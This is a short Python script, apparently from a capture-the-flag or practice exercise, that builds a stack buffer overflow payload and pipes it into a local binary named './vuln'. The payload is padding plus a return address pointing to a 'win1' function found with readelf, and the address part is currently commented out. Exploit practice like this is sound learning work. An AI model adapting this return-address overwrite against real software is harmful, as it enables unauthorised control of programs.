import subprocess

# Create your bytes data
payload = b''

# padding for buffer
payload += b'A' * 15

'''
# ebp
payload += b'B' * 4

# from readelf ./vuln -s:
#     18: 080491e0    43 FUNC    GLOBAL DEFAULT   13 win1
payload += b'\xe0\x91\x04\x08'

'''
payload += b'\n'


# Run the command and pass bytes as input
result = subprocess.run(
    ["./vuln"],  # Command
    input=payload,                 # Bytes input
    capture_output=True                # Capture stdout and stderr
)

# Access the output
print('Output:', result.stdout)
print('Return Code:', result.returncode)

